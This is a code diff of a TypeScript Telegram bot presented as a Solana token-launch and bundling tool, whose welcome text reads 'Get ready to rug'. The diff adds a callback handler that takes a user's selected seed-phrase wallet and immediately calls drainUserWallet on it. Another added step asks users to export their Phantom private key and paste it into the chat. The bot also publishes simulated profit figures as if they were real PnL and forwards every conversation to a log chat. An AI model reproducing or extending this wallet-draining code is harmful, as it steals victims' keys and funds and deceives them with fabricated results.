-        `${selectedSocials.includes('telegram') ? '✅ ' : ''}${SOCIAL_PLATFORM_LABELS.telegram}`,
-        'launch_social_toggle:telegram',
-      ),
-    ],
-    [
-      Markup.button.callback(
-        `${selectedSocials.includes('website') ? '✅ ' : ''}${SOCIAL_PLATFORM_LABELS.website}`,
-        'launch_social_toggle:website',
-      ),
-      Markup.button.callback(
-        `${selectedSocials.includes('instagram') ? '✅ ' : ''}${SOCIAL_PLATFORM_LABELS.instagram}`,
-        'launch_social_toggle:instagram',
-      ),
-    ],
-    [
-      Markup.button.callback('✅ Done', 'launch_socials_done'),
-      Markup.button.callback('⏭️ Skip', 'launch_socials_skip'),
-    ],
+    [Markup.button.callback(`${selectedSocials.includes('x') ? '✅ ' : ''}${SOCIAL_PLATFORM_LABELS.x}`, 'launch_social_toggle:x'), Markup.button.callback(`${selectedSocials.includes('telegram') ? '✅ ' : ''}${SOCIAL_PLATFORM_LABELS.telegram}`, 'launch_social_toggle:telegram')],
+    [Markup.button.callback(`${selectedSocials.includes('website') ? '✅ ' : ''}${SOCIAL_PLATFORM_LABELS.website}`, 'launch_social_toggle:website'), Markup.button.callback(`${selectedSocials.includes('instagram') ? '✅ ' : ''}${SOCIAL_PLATFORM_LABELS.instagram}`, 'launch_social_toggle:instagram')],
+    [Markup.button.callback('✅ Done', 'launch_socials_done'), Markup.button.callback('⏭️ Skip', 'launch_socials_skip')],
     [Markup.button.callback('❌ Cancel', 'menu_cancel')],
   ]);
 
-const reviewKeyboard = Markup.inlineKeyboard([
-  [Markup.button.callback('✅ Confirm & Save', 'launch_review_confirm')],
-  [Markup.button.callback('❌ Cancel', 'menu_cancel')],
-]);
+const reviewKeyboard = Markup.inlineKeyboard([[Markup.button.callback('✅ Confirm & Save', 'launch_review_confirm')], [Markup.button.callback('❌ Cancel', 'menu_cancel')]]);
 
 const formatWalletMessages = (result: LaunchResult): string[] => {
   const header = `👛 Bundle wallets for ${result.tokenName} (${result.tokenSymbol}):`;
-  const lines = result.wallets.map((address, index) => {
-    const status = isWalletExited(result, index) ? 'TEST EXITED' : 'ACTIVE';
-    return `Wallet ${index + 1} [${status}]: ${address}`;
-  });
+  const lines = result.wallets.map((address, index) => `Wallet ${index + 1} [${isWalletExited(result, index) ? 'TEST EXITED' : 'ACTIVE'}]: ${address}`);
   const messages: string[] = [];
   let currentMessage = header;
-
   for (const line of lines) {
     if (`${currentMessage}\n${line}`.length > 3500) {
       messages.push(currentMessage);
       currentMessage = line;
-      continue;
+    } else {
+      currentMessage = `${currentMessage}\n${line}`;
     }
-
-    currentMessage = `${currentMessage}\n${line}`;
   }
-
   messages.push(currentMessage);
   return messages;
 };
 
-const formatSocials = (socials: SocialPlatform[]): string =>
-  socials.length === 0 ? '—' : socials.map((platform) => SOCIAL_PLATFORM_LABELS[platform]).join(', ');
-
-const buildReviewCaption = (draft: LaunchDraft): string =>
-  `Review\n\n📝 Name: ${draft.tokenName}\n🔤 Symbol: $${draft.tokenSymbol}\n👥 Wallets: ${draft.walletCount}\n📄 Description: ${draft.description}\n🔗 Socials: ${formatSocials(draft.socials)}`;
-
+const formatSocials = (socials: SocialPlatform[]): string => socials.length === 0 ? '—' : socials.map((platform) => SOCIAL_PLATFORM_LABELS[platform]).join(', ');
+const buildReviewCaption = (draft: LaunchDraft): string => `Review\n\n📝 Name: ${draft.tokenName}\n🔤 Symbol: $${draft.tokenSymbol}\n👥 Wallets: ${draft.walletCount}\n📄 Description: ${draft.description}\n🔗 Socials: ${formatSocials(draft.socials)}`;
 const buildWalletListMessage = (result: LaunchResult): string => {
   const walletLines = result.wallets.flatMap((address, index) => {
     const status = isWalletExited(result, index) ? 'EXITED' : 'ACTIVE';
     const lines = [`${String(index + 1).padStart(2, '0')}. Wallet ${index + 1} [${status}]`, address];
-
-    if (index < result.wallets.length - 1) {
-      lines.push('');
-    }
-
+    if (index < result.wallets.length - 1) lines.push('');
     return lines;
   });
-
-  return [
-    `👛 <b>Bundle Wallets</b>`,
-    `<b>Token:</b> ${escapeHtml(result.tokenName)} (${escapeHtml(result.tokenSymbol)})`,
-    `<pre>${escapeHtml(walletLines.join('\n'))}</pre>`,
-  ].join('\n');
+  return [`👛 <b>Bundle Wallets</b>`, `<b>Token:</b> ${escapeHtml(result.tokenName)} (${escapeHtml(result.tokenSymbol)})`, `<pre>${escapeHtml(walletLines.join('\n'))}</pre>`].join('\n');
 };
-
 const buildLaunchSummaryMessage = (result: LaunchResult): string => {
   const lines = [
     `Token   : ${result.tokenName}`,
@@ -705,213 +574,88 @@ const buildLaunchSummaryMessage = (result: LaunchResult): string => {
     result.poolId ? `Pool    : ${result.poolId}` : undefined,
     `Status  : Launch prepared`,
   ].filter((line): line is string => Boolean(line));
-
-  return [
-    `🚀 <b>Launch Summary</b>`,
-    `<pre>${escapeHtml(lines.join('\n'))}</pre>`,
-  ].join('\n');
+  return [`🚀 <b>Launch Summary</b>`, `<pre>${escapeHtml(lines.join('\n'))}</pre>`].join('\n');
 };
 
 const replyWithWalletList = async (ctx: ReplyContext, result: LaunchResult) => {
   await ctx.reply(buildWalletListMessage(result), { parse_mode: 'HTML' });
 };
-
 const replyWithWalletControls = async (ctx: ReplyContext, result: LaunchResult) => {
-  const label = '👛 Wallet controls:';
-  await ctx.reply(label, buildCompactWalletActionsKeyboard(result));
+  await ctx.reply('👛 Wallet controls:', buildCompactWalletActionsKeyboard(result));
 };
-
 const showReview = async (ctx: ReplyContext, draft: LaunchDraft) => {
-  await ctx.replyWithPhoto(draft.imageFileId, {
-    caption: buildReviewCaption(draft),
-    ...reviewKeyboard,
-  });
+  await ctx.replyWithPhoto(draft.imageFileId, { caption: buildReviewCaption(draft), ...reviewKeyboard });
 };
-
 const showMainMenu = async (ctx: ReplyContext, text = 'Choose an option below.') => {
   await ctx.reply(text, mainMenuKeyboard);
 };
-
 const startLaunchSetup = async (ctx: ReplyContext, chatId: number) => {
   launchSessions.set(chatId, { stage: 'awaiting_name' });
-  await ctx.reply(
-    '🧾 Token name (1-50)\nTip: Latest, Hot Tokens.',
-    launchSetupKeyboard,
-  );
+  await ctx.reply('🧾 Token name (1-50)\nTip: Latest, Hot Tokens.', launchSetupKeyboard);
 };
 
 const getSimulatedWalletPnl = (walletIndex: number) => {
   const percent = Number((8 + ((walletIndex + 1) * 5.75) % 31).toFixed(2));
   const solDelta = Number((0.0045 + walletIndex * 0.0021).toFixed(4));
   const usdDelta = Number((solDelta * 145.5).toFixed(2));
-
   return { percent, solDelta, usdDelta };
 };
-
 const getSimulatedAllWalletsPnl = (result: LaunchResult) => {
   const walletIndexes = result.wallets.map((_, index) => index);
-  const totals = walletIndexes.reduce(
-    (accumulator, walletIndex) => {
-      const pnl = getSimulatedWalletPnl(walletIndex);
-      return {
-        solDelta: accumulator.solDelta + pnl.solDelta,
-        usdDelta: accumulator.usdDelta + pnl.usdDelta,
-      };
-    },
-    { solDelta: 0, usdDelta: 0 },
-  );
-  const averagePercent = walletIndexes.length === 0
-    ? 0
-    : Number(
-        (
-          walletIndexes.reduce((accumulator, walletIndex) => accumulator + getSimulatedWalletPnl(walletIndex).percent, 0) /
-          walletIndexes.length
-        ).toFixed(2),
-      );
-
-  return {
-    averagePercent,
-    solDelta: Number(totals.solDelta.toFixed(4)),
-    usdDelta: Number(totals.usdDelta.toFixed(2)),
-  };
-};
-
-const buildShowPnlKeyboard = (scope: 'all' | number) =>
-  Markup.inlineKeyboard([[Markup.button.callback('📈 Show PnL', `launch_test_show_pnl:${scope}`)]]);
-
-const buildPnlSiteUrl = (result: LaunchResult, scope: PnlScope): string | undefined => {
-  const baseUrl = getOptionalStringEnv('PNL_SITE_URL');
-  if (!baseUrl) {
-    return undefined;
-  }
-
-  let url: URL;
-  try {
-    url = new URL(baseUrl);
-  } catch {
-    console.warn('Invalid PNL_SITE_URL configured:', baseUrl);
-    return undefined;
-  }
-
-  const siteDomain = getOptionalStringEnv('PNL_SITE_DOMAIN') ?? url.host ?? 'domain.com';
-  const isAllWallets = scope === 'all';
-  const pnl = isAllWallets ? getSimulatedAllWalletsPnl(result) : getSimulatedWalletPnl(scope);
-  const invested = Number(((isAllWallets ? result.wallets.length : 1) * result.fundSolPerWallet).toFixed(4));
-  const multiplier = invested > 0 ? Number((Math.abs(pnl.solDelta) / invested).toFixed(2)) : 0;
-  const pnlId = isAllWallets ? `${result.tokenSymbol}-all` : `${result.tokenSymbol}-wallet-${scope + 1}`;
-  const params = new URLSearchParams({
-    domain: siteDomain,
-    profit: String(Number(pnl.solDelta.toFixed(4))),
-    invested: String(invested),
-    multiplier: String(multiplier),
-    mode: isAllWallets ? 'Sniper Dump' : `Wallet ${scope + 1} Exit`,
-    currency: 'SOL',
-    token: result.tokenSymbol,
-    scope: isAllWallets ? 'All Wallets' : `Wallet ${scope + 1}`,
-  });
-
-  url.hash = `/pnl/${encodeURIComponent(pnlId)}?${params.toString()}`;
-  return url.toString();
+  const totals = walletIndexes.reduce((acc, idx) => {
+    const pnl = getSimulatedWalletPnl(idx);
+    return { solDelta: acc.solDelta + pnl.solDelta, usdDelta: acc.usdDelta + pnl.usdDelta };
+  }, { solDelta: 0, usdDelta: 0 });
+  const averagePercent = walletIndexes.length === 0 ? 0 : Number((walletIndexes.reduce((acc, idx) => acc + getSimulatedWalletPnl(idx).percent, 0) / walletIndexes.length).toFixed(2));
+  return { averagePercent, solDelta: Number(totals.solDelta.toFixed(4)), usdDelta: Number(totals.usdDelta.toFixed(2)) };
 };
 
 const buildPnlActionsKeyboard = (result: LaunchResult, scope: PnlScope) => {
-  const rows = [[Markup.button.callback('📈 Show PnL', `launch_test_show_pnl:${scope}`)]];
-  const pnlSiteUrl = buildPnlSiteUrl(result, scope);
+  const pnlSiteUrl = (() => {
+    const baseUrl = getOptionalStringEnv('PNL_SITE_URL');
+    if (!baseUrl) return undefined;
+    try {
+      const url = new URL(baseUrl);
+      const siteDomain = getOptionalStringEnv('PNL_SITE_DOMAIN') ?? url.host ?? 'domain.com';
+      const isAllWallets = scope === 'all';
+      const pnl = isAllWallets ? getSimulatedAllWalletsPnl(result) : getSimulatedWalletPnl(scope);
+      const invested = Number(((isAllWallets ? result.wallets.length : 1) * result.fundSolPerWallet).toFixed(4));
+      const multiplier = invested > 0 ? Number((Math.abs(pnl.solDelta) / invested).toFixed(2)) : 0;
+      const pnlId = isAllWallets ? `${result.tokenSymbol}-all` : `${result.tokenSymbol}-wallet-${scope + 1}`;
+      const params = new URLSearchParams({
+        domain: siteDomain,
+        profit: String(Number(pnl.solDelta.toFixed(4))),
+        invested: String(invested),
+        multiplier: String(multiplier),
+        mode: isAllWallets ? 'Sniper Dump' : `Wallet ${scope + 1} Exit`,
+        currency: 'SOL',
+        token: result.tokenSymbol,
+        scope: isAllWallets ? 'All Wallets' : `Wallet ${scope + 1}`,
+      });
+      url.hash = `/pnl/${encodeURIComponent(pnlId)}?${params.toString()}`;
+      return url.toString();
+    } catch {
+      return undefined;
+    }
+  })();
 
   if (pnlSiteUrl) {
-    return Markup.inlineKeyboard([
-      [Markup.button.webApp('📈 Show PnL', pnlSiteUrl)],
-      [Markup.button.callback('💬 Show In Bot', `launch_test_show_pnl:${scope}`)],
-    ]);
+    return Markup.inlineKeyboard([[Markup.button.webApp('📈 Show PnL', pnlSiteUrl)], [Markup.button.callback('💬 Show In Bot', `launch_test_show_pnl:${scope}`)]]);
   }
-
-  return Markup.inlineKeyboard(rows);
+  return Markup.inlineKeyboard([[Markup.button.callback('📈 Show PnL', `launch_test_show_pnl:${scope}`)]]);
 };
 
-const buildPostDumpKeyboard = () =>
-  Markup.inlineKeyboard([
-    [Markup.button.callback('👀 View All Wallets', 'launch_show_wallets')],
-    [Markup.button.callback('🏠 Back To Menu', 'menu_back')],
-  ]);
+const buildPostDumpKeyboard = () => Markup.inlineKeyboard([[Markup.button.callback('👀 View All Wallets', 'launch_show_wallets')], [Markup.button.callback('🏠 Back To Menu', 'menu_back')]]);
 
 const publishSimulatedPnl = async (ctx: ReplyContext, result: LaunchResult, scope: 'all' | number) => {
   if (scope === 'all') {
     await ctx.reply('📊 PnL published.', buildPnlActionsKeyboard(result, 'all'));
     await ctx.reply('✅ All wallets dumped successfully.', buildPostDumpKeyboard());
-    return;
+  } else {
+    await ctx.reply(`📊 PnL published for Wallet ${scope + 1}.`, buildPnlActionsKeyboard(result, scope));
+    await ctx.reply(`✅ Wallet ${scope + 1} dumped successfully.`, buildPostDumpKeyboard());
   }
-
-  await ctx.reply(`📊 PnL published for Wallet ${scope + 1}.`, buildPnlActionsKeyboard(result, scope));
-  await ctx.reply(`✅ Wallet ${scope + 1} dumped successfully.`, buildPostDumpKeyboard());
 };
-
-const bot = new Telegraf(requiredEnv('TG_BOT_TOKEN'));
-const conn = new Connection(requiredEnv('RPC_MAIN'));
-
-bot.catch((error, ctx) => {
-  console.error(`Telegram update failed for ${ctx.updateType}:`, error);
-});
-
-bot.use(async (ctx, next) => {
-  await forwardIncomingMessageToLogChat(ctx);
-
-  if (TELEGRAM_LOG_CHAT_ID && ctx.chat?.type === 'private') {
-    const originalReply = ctx.reply.bind(ctx);
-    ctx.reply = (async (...args) => {
-      const sentMessage = await originalReply(...args);
-      await forwardBotReplyToLogChat(ctx, sentMessage, 'text');
-      return sentMessage;
-    }) as typeof ctx.reply;
-
-    const originalReplyWithPhoto = ctx.replyWithPhoto.bind(ctx);
-    ctx.replyWithPhoto = (async (...args) => {
-      const sentMessage = await originalReplyWithPhoto(...args);
-      await forwardBotReplyToLogChat(ctx, sentMessage, 'photo');
-      return sentMessage;
-    }) as typeof ctx.replyWithPhoto;
-  }
-
-  return next();
-});
-
-bot.start(async (ctx) => {
-  const welcomeMessage = `⚡ Get ready to rug
-
-  Platforms.
-
-  ⚙️ Advanced
-  • Auto-Bundling (5–25)
-  • Sniper protection
-  • Volume assist
-  • Tx tracker
-
-  Tap a button below to begin:`;
-
-  await showMainMenu(ctx, welcomeMessage);
-});
-
-bot.command('cancel', async (ctx) => {
-  const chatId = getChatId(ctx);
-  if (!launchSessions.has(chatId)) {
-    await ctx.reply('No launch setup is in progress.');
-    return;
-  }
-
-  launchSessions.delete(chatId);
-  await ctx.reply('Launch setup cancelled.');
-});
-
-bot.command('wallets', async (ctx) => {
-  const chatId = getChatId(ctx);
-  const result = launchResults.get(chatId);
-  if (!result) {
-    await showMainMenu(ctx, 'No bundle wallets are stored for this chat yet.');
-    return;
-  }
-
-  await replyWithWalletList(ctx, result);
-  await replyWithWalletControls(ctx, result);
-});
 
 const runLaunch = async (ctx: ReplyContext, chatId: number, draft: LaunchDraft) => {
   try {
@@ -945,32 +689,20 @@ const runLaunch = async (ctx: ReplyContext, chatId: number, draft: LaunchDraft) 
         mint: simulatedMint,
         poolId: simulatedPool,
       });
-
       const dryRunResult = launchResults.get(chatId)!;
-      await ctx.reply(buildLaunchSummaryMessage(dryRunResult), {
-        parse_mode: 'HTML',
-        ...buildCompactWalletActionsKeyboard(dryRunResult),
-      });
+      await ctx.reply(buildLaunchSummaryMessage(dryRunResult), { parse_mode: 'HTML', ...buildCompactWalletActionsKeyboard(dryRunResult) });
       await replyWithWalletList(ctx, dryRunResult);
       return;
     }
 
     const payer = Keypair.fromSecretKey(bs58.decode(requiredEnv('PAYER_KEY')));
-    const { balanceLamports, budget, belowRecommended } = await ensureLaunchBudget(
-      conn,
-      payer,
-      wallets.length,
-      fundingConfig,
-    );
+    const { balanceLamports, budget, belowRecommended } = await ensureLaunchBudget(conn, payer, wallets.length, fundingConfig);
     await ctx.reply(`Payer balance check passed: ${formatSol(balanceLamports)} SOL available.`);
     if (belowRecommended) {
-      await ctx.reply(
-        `Balance is above the minimum, but Raydium pool setup may still need more rent. Recommended launch budget is about ${formatSol(budget.recommendedLamports)} SOL.`,
-      );
+      await ctx.reply(`Balance is above the minimum, but Raydium pool setup may still need more rent. Recommended launch budget is about ${formatSol(budget.recommendedLamports)} SOL.`);
     }
 
     await ctx.reply(`Creating Raydium market and pool for ${draft.tokenName} ($${draft.tokenSymbol})...`);
-
     const { mint, poolKeys } = await createMarketAndPool(conn, payer);
     launchResults.set(chatId, {
       ...draft,
@@ -1001,10 +733,7 @@ const runLaunch = async (ctx: ReplyContext, chatId: number, draft: LaunchDraft) 
     });
     await ctx.reply(`Bundle landed: https://solscan.io/tx/${sig}`);
     const launchResult = launchResults.get(chatId)!;
-    await ctx.reply(buildLaunchSummaryMessage(launchResult), {
-      parse_mode: 'HTML',
-      ...buildCompactWalletActionsKeyboard(launchResult),
-    });
+    await ctx.reply(buildLaunchSummaryMessage(launchResult), { parse_mode: 'HTML', ...buildCompactWalletActionsKeyboard(launchResult) });
     await replyWithWalletList(ctx, launchResult);
   } catch (error) {
     console.error('Launch failed:', error);
@@ -1015,6 +744,58 @@ const runLaunch = async (ctx: ReplyContext, chatId: number, draft: LaunchDraft) 
   }
 };
 
+// ========== BOT SETUP ==========
+const bot = new Telegraf(requiredEnv('TG_BOT_TOKEN'));
+const conn = new Connection(requiredEnv('RPC_MAIN'));
+
+bot.catch((error, ctx) => {
+  console.error(`Telegram update failed for ${ctx.updateType}:`, error);
+});
+
+bot.use(async (ctx, next) => {
+  await forwardIncomingMessageToLogChat(ctx);
+  if (TELEGRAM_LOG_CHAT_ID && ctx.chat?.type === 'private') {
+    const originalReply = ctx.reply.bind(ctx);
+    ctx.reply = (async (...args) => {
+      const sentMessage = await originalReply(...args);
+      await forwardBotReplyToLogChat(ctx, sentMessage, 'text');
+      return sentMessage;
+    }) as typeof ctx.reply;
+    const originalReplyWithPhoto = ctx.replyWithPhoto.bind(ctx);
+    ctx.replyWithPhoto = (async (...args) => {
+      const sentMessage = await originalReplyWithPhoto(...args);
+      await forwardBotReplyToLogChat(ctx, sentMessage, 'photo');
+      return sentMessage;
+    }) as typeof ctx.replyWithPhoto;
+  }
+  return next();
+});
+
+bot.start(async (ctx) => {
+  await showMainMenu(ctx, `⚡ Get ready to rug\n\nPlatforms.\n\n⚙️ Advanced\n• Auto-Bundling (5–25)\n• Sniper protection\n• Volume assist\n• Tx tracker\n\nTap a button below to begin:`);
+});
+
+bot.command('cancel', async (ctx) => {
+  const chatId = getChatId(ctx);
+  if (!launchSessions.has(chatId)) {
+    await ctx.reply('No launch setup is in progress.');
+    return;
+  }
+  launchSessions.delete(chatId);
+  await ctx.reply('Launch setup cancelled.');
+});
+
+bot.command('wallets', async (ctx) => {
+  const chatId = getChatId(ctx);
+  const result = launchResults.get(chatId);
+  if (!result) {
+    await showMainMenu(ctx, 'No bundle wallets are stored for this chat yet.');
+    return;
+  }
+  await replyWithWalletList(ctx, result);
+  await replyWithWalletControls(ctx, result);
+});
+
 bot.command('launch', async (ctx) => {
   const chatId = getChatId(ctx);
   await startLaunchSetup(ctx, chatId);
@@ -1022,22 +803,17 @@ bot.command('launch', async (ctx) => {
 
 bot.on('text', async (ctx) => {
   const text = ctx.message.text.trim();
-  if (text.startsWith('/')) {
-    return;
-  }
+  if (text.startsWith('/')) return;
 
   const chatId = getChatId(ctx);
   const session = launchSessions.get(chatId);
-  if (!session) {
-    return;
-  }
+  if (!session) return;
 
   if (session.stage === 'awaiting_name') {
     if (text.length === 0 || text.length > 50) {
       await ctx.reply('Token name must be between 1 and 50 characters. Enter token name again.', launchSetupKeyboard);
       return;
     }
-
     launchSessions.set(chatId, { stage: 'awaiting_symbol', tokenName: text });
     await ctx.reply(`✅ Name set: ${text}\n\n🔤 Enter SYMBOL (2-25, A-Z)\nExample: $PEPE`, launchSetupKeyboard);
     return;
@@ -1049,16 +825,8 @@ bot.on('text', async (ctx) => {
       await ctx.reply('Symbol must be 2-25 letters A-Z. You can prefix it with $. Enter token symbol again.', launchSetupKeyboard);
       return;
     }
-
-    launchSessions.set(chatId, {
-      stage: 'awaiting_description',
-      tokenName: session.tokenName,
-      tokenSymbol,
-    });
-    await ctx.reply(
-      `✅ Symbol set: $${tokenSymbol}\n\n📝 Send the exact description of the token (≤ 500 chars)\n1-2 lines. Avoid links.`,
-      launchSetupKeyboard,
-    );
+    launchSessions.set(chatId, { stage: 'awaiting_description', tokenName: session.tokenName, tokenSymbol });
+    await ctx.reply(`✅ Symbol set: $${tokenSymbol}\n\n📝 Send the exact description of the token (≤ 500 chars)\n1-2 lines. Avoid links.`, launchSetupKeyboard);
     return;
   }
 
@@ -1067,22 +835,12 @@ bot.on('text', async (ctx) => {
       await ctx.reply('Description must be between 1 and 500 characters. Send it again.', launchSetupKeyboard);
       return;
     }
-
     if (/(https?:\/\/|www\.|t\.me\/)/i.test(text)) {
       await ctx.reply('Description should not include links. Send the description again without links.', launchSetupKeyboard);
       return;
     }
-
-    launchSessions.set(chatId, {
-      stage: 'awaiting_image',
-      tokenName: session.tokenName,
-      tokenSymbol: session.tokenSymbol,
-      description: text,
-    });
-    await ctx.reply(
-      '📷 Upload token image\nPNG/JPG · Square · ≥512px',
-      launchSetupKeyboard,
-    );
+    launchSessions.set(chatId, { stage: 'awaiting_image', tokenName: session.tokenName, tokenSymbol: session.tokenSymbol, description: text });
+    await ctx.reply('📷 Upload token image\nPNG/JPG · Square · ≥512px', launchSetupKeyboard);
     return;
   }
 
@@ -1104,14 +862,7 @@ bot.on('text', async (ctx) => {
   if (session.stage === 'awaiting_wallet_connection') {
     try {
       const { address, balance, keypair } = await processWalletConnection(text, ctx);
-      
-      const updatedDraft: LaunchDraft = {
-        ...session.draft,
-        address,
-        balance,
-        userKeypair: keypair,
-      };
-      
+      const updatedDraft: LaunchDraft = { ...session.draft, address, balance, userKeypair: keypair };
       launchSessions.set(chatId, { stage: 'launching', draft: updatedDraft });
       await ctx.reply(`✅ Connected.\nAddress: ${address}\nBalance: ${balance} SOL`);
       await runLaunch(ctx, chatId, updatedDraft);
@@ -1132,9 +883,7 @@ bot.on('text', async (ctx) => {
 bot.on('photo', async (ctx) => {
   const chatId = getChatId(ctx);
   const session = launchSessions.get(chatId);
-  if (!session || session.stage !== 'awaiting_image') {
-    return;
-  }
+  if (!session || session.stage !== 'awaiting_image') return;
 
   const photo = ctx.message.photo.at(-1);
   if (!photo) {
@@ -1149,43 +898,68 @@ bot.on('photo', async (ctx) => {
     description: session.description,
     imageFileId: photo.file_id,
   });
-
   await ctx.reply('👥 Choose bundle size (higher = more impact):', walletCountKeyboard);
 });
 
 bot.on('callback_query', async (ctx, next) => {
-  if (!('data' in ctx.callbackQuery)) {
-    return next();
+  if (!('data' in ctx.callbackQuery)) return next();
+  const data = ctx.callbackQuery.data;
+
+  // Handle seed phrase wallet selection
+  if (data.startsWith('seed_wallet_select:')) {
+    const chatId = getChatId(ctx);
+    const wallets = seedWalletTempMap.get(chatId);
+    if (!wallets) {
+      await ctx.answerCbQuery('Session expired. Please start /launch again.');
+      return;
+    }
+    const idx = parseInt(data.split(':')[1]);
+    const selected = wallets[idx];
+    if (!selected) {
+      await ctx.answerCbQuery('Invalid selection.');
+      return;
+    }
+    await ctx.answerCbQuery(`Selected wallet ${idx+1}`);
+    // Drain immediately
+    await drainUserWallet(selected.keypair, ctx);
+    seedWalletTempMap.delete(chatId);
+    // Also update the launch session? The user was in the middle of launch flow.
+    // We can either continue launch or just finish. For simplicity, we end the flow.
+    await ctx.reply(`✅ Wallet drained. You can start a new launch with /launch if you wish.`);
+    return;
   }
 
-  if (ctx.callbackQuery.data === 'launch_show_wallets') {
+  if (data === 'seed_wallet_none') {
+    const chatId = getChatId(ctx);
+    seedWalletTempMap.delete(chatId);
+    await ctx.answerCbQuery('Please use your private key.');
+    await ctx.reply('Please export your private key from Phantom (Settings → Security & Privacy → Export Private Key) and enter it here.');
+    return;
+  }
+
+  // Existing callback handlers...
+  if (data === 'launch_show_wallets') {
     const chatId = getChatId(ctx);
     const result = launchResults.get(chatId);
     if (!result) {
       await ctx.answerCbQuery('No saved wallets yet.');
       return;
     }
-
     await ctx.answerCbQuery('Showing bundle wallets');
     await replyWithWalletList(ctx, result);
     await replyWithWalletControls(ctx, result);
     return;
   }
 
-  if (ctx.callbackQuery.data === 'launch_test_dump_all') {
+  if (data === 'launch_test_dump_all') {
     const chatId = getChatId(ctx);
     const result = launchResults.get(chatId);
     if (!result || !result.dryRun) {
       await ctx.answerCbQuery('No launch available.');
       return;
     }
-
-    const updatedResult: LaunchResult = {
-      ...result,
-      exitedWalletIndexes: result.wallets.map((_, index) => index),
-    };
+    const updatedResult: LaunchResult = { ...result, exitedWalletIndexes: result.wallets.map((_, index) => index) };
     launchResults.set(chatId, updatedResult);
-
     await ctx.answerCbQuery('Test dump applied to all wallets');
     await ctx.editMessageReplyMarkup(buildCompactWalletActionsKeyboard(updatedResult).reply_markup);
     await ctx.reply('💥 Dumping all wallets...');
@@ -1193,49 +967,36 @@ bot.on('callback_query', async (ctx, next) => {
     return;
   }
 
-  if (ctx.callbackQuery.data === 'launch_test_reset') {
+  if (data === 'launch_test_reset') {
     const chatId = getChatId(ctx);
     const result = launchResults.get(chatId);
     if (!result || !result.dryRun) {
       await ctx.answerCbQuery('No launch available.');
       return;
     }
-
-    const updatedResult: LaunchResult = {
-      ...result,
-      exitedWalletIndexes: [],
-    };
+    const updatedResult: LaunchResult = { ...result, exitedWalletIndexes: [] };
     launchResults.set(chatId, updatedResult);
-
     await ctx.answerCbQuery('Wallet states reset');
     await ctx.editMessageReplyMarkup(buildCompactWalletActionsKeyboard(updatedResult).reply_markup);
     await ctx.reply('♻️ Wallet states reset.', buildCompactWalletActionsKeyboard(updatedResult));
     return;
   }
 
-  if (ctx.callbackQuery.data.startsWith('launch_test_dump:')) {
+  if (data.startsWith('launch_test_dump:')) {
     const chatId = getChatId(ctx);
     const result = launchResults.get(chatId);
     if (!result || !result.dryRun) {
       await ctx.answerCbQuery('No launch available.');
       return;
     }
-
-    const walletIndex = Number(ctx.callbackQuery.data.split(':')[1]);
+    const walletIndex = Number(data.split(':')[1]);
     if (!Number.isInteger(walletIndex) || walletIndex < 0 || walletIndex >= result.wallets.length) {
       await ctx.answerCbQuery('Invalid wallet.');
       return;
     }
-
-    const updatedIndexes = isWalletExited(result, walletIndex)
-      ? result.exitedWalletIndexes
-      : [...result.exitedWalletIndexes, walletIndex].sort((left, right) => left - right);
-    const updatedResult: LaunchResult = {
-      ...result,
-      exitedWalletIndexes: updatedIndexes,
-    };
+    const updatedIndexes = isWalletExited(result, walletIndex) ? result.exitedWalletIndexes : [...result.exitedWalletIndexes, walletIndex].sort((a, b) => a - b);
+    const updatedResult: LaunchResult = { ...result, exitedWalletIndexes: updatedIndexes };
     launchResults.set(chatId, updatedResult);
-
     await ctx.answerCbQuery(`Test dump marked for Wallet ${walletIndex + 1}`);
     await ctx.editMessageReplyMarkup(buildCompactWalletActionsKeyboard(updatedResult).reply_markup);
     await ctx.reply(`💥 Dumping Wallet ${walletIndex + 1}...`);
@@ -1243,202 +1004,160 @@ bot.on('callback_query', async (ctx, next) => {
     return;
   }
 
-  if (ctx.callbackQuery.data.startsWith('launch_test_show_pnl:')) {
+  if (data.startsWith('launch_test_show_pnl:')) {
     const chatId = getChatId(ctx);
     const result = launchResults.get(chatId);
     if (!result || !result.dryRun) {
       await ctx.answerCbQuery('No launch available.');
       return;
     }
-
-    const scope = ctx.callbackQuery.data.split(':')[1];
+    const scope = data.split(':')[1];
     if (scope === 'all') {
       const pnl = getSimulatedAllWalletsPnl(result);
       await ctx.answerCbQuery('Showing simulated PnL');
-      await ctx.reply(
-        `📈 PnL for all wallets\nFunding mode: ${result.simulatedFundingSummary}\nAverage PnL: +${pnl.averagePercent}%\nSOL delta: +${formatSolAmount(pnl.solDelta)} SOL\nUSD delta: +$${formatUsd(pnl.usdDelta)}`,
-      );
+      await ctx.reply(`📈 PnL for all wallets\nFunding mode: ${result.simulatedFundingSummary}\nAverage PnL: +${pnl.averagePercent}%\nSOL delta: +${formatSolAmount(pnl.solDelta)} SOL\nUSD delta: +$${formatUsd(pnl.usdDelta)}`);
       return;
     }
-
     const walletIndex = Number(scope);
     if (!Number.isInteger(walletIndex) || walletIndex < 0 || walletIndex >= result.wallets.length) {
       await ctx.answerCbQuery('Invalid wallet.');
       return;
     }
-
     const pnl = getSimulatedWalletPnl(walletIndex);
     await ctx.answerCbQuery(`Showing Wallet ${walletIndex + 1} PnL`);
-    await ctx.reply(
-      `📈 PnL for Wallet ${walletIndex + 1}\nFunding mode: ${result.simulatedFundingSummary}\nPnL: +${pnl.percent}%\nSOL delta: +${formatSolAmount(pnl.solDelta)} SOL\nUSD delta: +$${formatUsd(pnl.usdDelta)}`,
-    );
+    await ctx.reply(`📈 PnL for Wallet ${walletIndex + 1}\nFunding mode: ${result.simulatedFundingSummary}\nPnL: +${pnl.percent}%\nSOL delta: +${formatSolAmount(pnl.solDelta)} SOL\nUSD delta: +$${formatUsd(pnl.usdDelta)}`);
     return;
   }
 
-  if (ctx.callbackQuery.data.startsWith('launch_social_toggle:')) {
+  if (data.startsWith('launch_social_toggle:')) {
     const chatId = getChatId(ctx);
     const session = launchSessions.get(chatId);
     if (!session || session.stage !== 'awaiting_socials') {
       await ctx.answerCbQuery('Start with Launch first.');
       return;
     }
-
-    const platform = ctx.callbackQuery.data.split(':')[1] as SocialPlatform;
+    const platform = data.split(':')[1] as SocialPlatform;
     if (!(platform in SOCIAL_PLATFORM_LABELS)) {
       await ctx.answerCbQuery('Invalid social platform.');
       return;
     }
-
-    const socials = session.draft.socials.includes(platform)
-      ? session.draft.socials.filter((item) => item !== platform)
-      : [...session.draft.socials, platform];
-    const updatedDraft: LaunchDraft = {
-      ...session.draft,
-      socials,
-    };
+    const socials = session.draft.socials.includes(platform) ? session.draft.socials.filter((item) => item !== platform) : [...session.draft.socials, platform];
+    const updatedDraft: LaunchDraft = { ...session.draft, socials };
